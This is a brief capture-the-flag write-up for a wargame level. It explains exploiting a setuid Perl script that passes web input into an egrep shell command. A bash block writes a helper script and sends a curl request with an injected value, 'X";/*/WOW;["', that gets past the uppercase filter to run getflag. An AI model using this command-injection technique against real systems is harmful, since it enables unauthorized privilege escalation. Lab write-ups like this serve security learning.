# pwn

the home for this user contains an suid perl script
this script takes user input and does the following:
- substitute all lowercase letters for uppercase letters
- finds the first space and removes everything after it

it then runs this modified input in the following command:

`egrep "^$xx" /tmp/xd 2>&1`

where `$xx` is the input

we use `/*/` to access a directory where we have permissions, and add a script that runs getflag, and in full uppercase letters to not be affected by the string modification
we then use curl to run our script:

```bash
cat <<EOF
#!/bin/bash
getflag >> /tmp/ptdr
EOF > /tmp/WOW

chmod +x /tmp/WOW

curl localhost:4646 -G --data-urlencode 'x=X";/*/WOW;["'

cat /tmp/ptdr
```

giving us our flag, we can now login as `level13`